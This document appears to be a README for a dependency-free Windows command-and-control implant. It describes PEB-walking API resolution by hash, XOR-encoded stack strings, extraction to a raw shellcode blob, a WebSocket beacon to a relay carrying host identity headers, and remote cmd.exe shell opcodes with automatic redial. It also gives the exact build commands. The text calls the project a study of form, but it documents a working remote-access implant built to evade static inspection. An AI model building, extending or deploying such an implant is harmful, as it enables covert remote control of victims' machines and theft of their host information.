# Minimal Agent — a Dependency-Free Windows Agent

A minimal agent for the C2 platform - C program that connects to a relay over WebSocket, introduces
itself with HTTP headers on the upgrade, and serves panel commands.

# Environment Contract

| Variable  | Meaning |
| ------------- |:-------------:|
| W_URL      | The relay the injected WebSocket agent connects to |

# Commands

| Opcode    | Command       | Behavior |
| ----------|:-------------:|:-------------:|
| 0x01      | OpenShell | Spawns a shell in the first free slot |
| 0x02      | WriteShell  | Sends input to the shell process stdin |
| 0x03      | ReadShell  | Reads output from an active shell session |
| 0x04      | CloseShell  | Closes the active shell session |
| 0x0A      | Exit | Terminates the agent process. No reply. |

---

What makes it interesting is what it does NOT have:

- **No CRT** — no printf, no malloc, no startup code from the C runtime;
- **No Import Table** — not a single DLL is listed in the PE imports;
  every OS call, WinHTTP included, is found at runtime by walking the
  process's own module list (the PEB) and matching name hashes;
- **No Strings in the Binary** — API names live as precomputed hash
  constants inside instructions; every string the agent needs, like the DLL
  names, the user agent, the identity headers and etc, is built on the
  stack, XOR-decoded as it is written;
- **No `.bss`** — nothing static; everything lives on stack frames
  chosen so their lifetime matches what the data needs;
- **Logging is a Build Option, Not a Feature** — release builds omit
  logging. Debug builds add `-DLOGGING_ENABLED` and use the hand-rolled
  formatter behind the `LOG_INFO` and `LOG_ERROR` macros.

The deliverable shape is a single-`.text` blob: the
exe is the same code inside a PE envelope, and `.bin` is that envelope
peeled off — byte 0 is the entry point.

---

## What you need

- Windows 8+ (WinHTTP's WebSocket API)
- **MinGW-w64 gcc** from MSYS2 (`ucrt64` environment). Nothing else -
  no SDK headers, no libraries: the project carries its own minimal
  type dictionary (`types.h`, `wintypes.h`) and resolves everything
  else at runtime.

---

## Build

The checked-in workflow uses llvm-mingw's gcc-compatible drivers. CI
compiles objects first so it can preserve `entry.o` as the first link
object and add the i386 relocation metadata; the VS Code tasks use the
same direct linker flags in one command.
Two rules make or break the result — both are enforced by CI gates:

1. **`entry.o` must be the FIRST object on the link line.** `entry.c`
   holds nothing but `entry()`, so the linker places it at byte 0 of
   `.text`. If a glob like `obj\*.o` sorts another object first, the
   exe still runs but the raw `.bin`
   blob starts with the wrong code and dies instantly.
2. **The linker merges read-only sections into `.text`** — CI verifies
  that the executable and extracted blob contain no referenced data
  outside `.text`.

### PowerShell (from the repo root)

```powershell
# 1) Start clean so release and debug objects cannot be mixed.
Remove-Item -Recurse -Force obj -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force obj | Out-Null

# 2) Compile. Sources: entry.c in the root, the rest in src\, headers in include\.
gcc -O2 -DLOGGING_ENABLED -Iinclude -fno-asynchronous-unwind-tables -fno-shrink-wrap -fno-ident -fno-jump-tables -fno-tree-vectorize -fno-tree-slp-vectorize -c entry.c src/stack_probes.c src/picfixup.c src/main.c src/transport.c src/shell.c src/system_facts.c src/environment.c src/winhttp_api.c src/ntdll.c src/kernel32.c src/advapi.c src/string.c src/memory.c src/peb.c src/system.c src/djb2.c src/logger.c src/commands.c

# 3) Park the objects.
Move-Item *.o obj

# 4) Link - entry.o FIRST, then the rest.
gcc -O2 -s -nostdlib -Iinclude -fno-asynchronous-unwind-tables -fno-ident -fno-jump-tables -fno-vectorize -fno-slp-vectorize -e entry -Wl,/merge:.rdata=.text -Wl,/merge:.rodata=.text -o minimal_agent.exe ( @(Get-Item obj\entry.o) + (Get-ChildItem obj\*.o -Exclude entry.o) | ForEach-Object FullName )
```

### Why these exact flags

- `-nostdlib` omits the CRT; `entry` is the process entry point.
- `-e entry` selects the freestanding entry function instead of CRT startup.
- `-Wl,/merge:.rdata=.text` and `-Wl,/merge:.rodata=.text` keep read-only
  data referenced by the code inside the extracted `.text` blob.

### Two coding rules that keep the blob alive

The build contract is **nothing outside `.text` may be referenced by
the code**. Two C constructs violate it silently:

- **Brace initializers with non-zero content** (`= {24, NULL, TRUE}`):
  both compilers may materialize the aggregate into `.rdata` and copy
  it with rip-relative loads. Use `MemoryZero` + explicit field stores.
- **String literals** (narrow or wide): they ARE `.rdata` by
  definition. Every runtime string goes through a stack-string builder
  (`stackstrings.h`), written byte-by-byte with a volatile key.

---

## Run

Set the relay URL before launch:

```powershell
$env:W_URL = "https://relay.example.com"   # your relay, root path (no /agent)
.\minimal_agent.exe                       
```

It prints (one line per step, values included):

```
[INF] Connecting to relay ...
[INF] Identity headers prepared: 356 byte(s)
[INF] Connected (HTTP 101 Switching Protocols)
[INF] Agent mode: replying to commands (capability mask = Shell)
[INF] recv OpenShell corr=14 len=1
[INF] Shell 0 opened (cmd.exe spawned)
[INF] recv WriteShell corr=15 len=17
[INF] Write to shell 0: 4 byte(s)
[INF] recv ReadShell corr=16 len=9
[INF] Read shell 0 - 174 byte(s)
```

The URL is the relay ROOT — the deployed relay generation accepts the
WebSocket upgrade on `/` (a `/agent` suffix gets a 404, the agent
retries forever).

**Identity is sent automatically.** The X-Agent-* HTTP headers ride
the WebSocket upgrade request itself (API 1): machine UUID, hostname, user, OS version,
build/commit tags, and the Shell capability bit. Without them the
relay still accepts the socket but the C2 never registers the agent —
its windows never open. Every header is built on the stack,
XOR-encoded — no plaintext in the binary.

Commands carry a correlation id (`[opcode][corrId:4 LE][payload]`) and
every reply echoes it (`[status:4][corrId:4][body]`) — the panel drops
replies whose echo does not match a pending command.


A lost connection is normal, not an error: the agent redials after a
backoff (1..32 s, reset after a healthy session). Live shells survive
a redial — their pool belongs to the process, not the connection.

Because the agent advertises Shell without FileSystem, the panel's
file manager falls back to PowerShell-over-shell — a basic file
browser works with zero file opcodes implemented.

---

## How the code is laid out

| File | What it owns |
|---|---|
| `entry.c` | `entry()` and nothing else: build the URL from the PEB environment, call agent_main, exit via ExitProcess. MUST stay the first object on the link line |
| `src/stack_probes.c` | the `__chkstk`/`__alloca` stack probes for x86_64 / i386 / aarch64 (kept out of entry.c so entry stays byte 0) |
| `main.c` | `agent_main`: owns process-lifetime state on its frame (shell pool, backoff), runs dial/serve/redial; command handlers with the v3 corrId framing |
| `protocol.h` | opcodes, statuses, API-1 constants, capability mask, buffer limits |
| `commands.h/.c` | shell handlers, identity headers |
| `wire.h` | tiny little-endian writers (header-only) |
| `transport.h/.c` | the WebSocket pipe: assembled message in (`WebSocketReceive`) |
| `shell.h/.c` | the cmd.exe pool: spawn / write / drain / teardown, 256 slots |
| `logger.h/.c` | the two-flavor logging: printf macros over a stack buffer; release compiles to nothing |
| `string.h/.c` | string helpers plus the bounded formatter used by dev logging |
| `system_facts.h/.c` | hostname, username, OS version (the identity payload) |
| `winhttp_api.h/.c` | the WinHTTP table + the LdrLoadDll bootstrap that maps winhttp.dll |
| `kernel32/ntdll/advapi.h/.c` | one function table per DLL, hash-resolved |
| `peb.h/.c` | TEB/PEB access, the module-list walk, environment reader |
| `system.h/.c` | export-table resolve — by name (tooling) and by hash (the agent) |
| `apihash.h` | the precomputed djb2 constants for every name used |
| `stackstrings.h` | every runtime string, built on the stack, XOR-decoded in the write |
| `djb2.h/.c` | the hash both resolve paths share |
| `string.c` / `memory.c` | the hand-rolled CRT replacements |

Reading order for a newcomer: `entry.c` (how a process starts without
a runtime) → `peb.c` + `system.c` (how functions are found without
imports) → `stackstrings.h` (how strings exist without existing) →
`transport.c` (the wire) → `main.c` (the loop).

---

## Honest limitations

- Shell only: no native file or screen opcodes (the panel covers files
  via its PowerShell-over-shell fallback); shells die with the process.
- WinHTTP is loaded at runtime but visible in the process's module
  list for its whole life (removing it is future work).
- The connection pattern (periodic dial to one host, a non-browser
  user agent) is trivially visible to network monitoring — deliberate
  scope: this project studies form, not evasion.
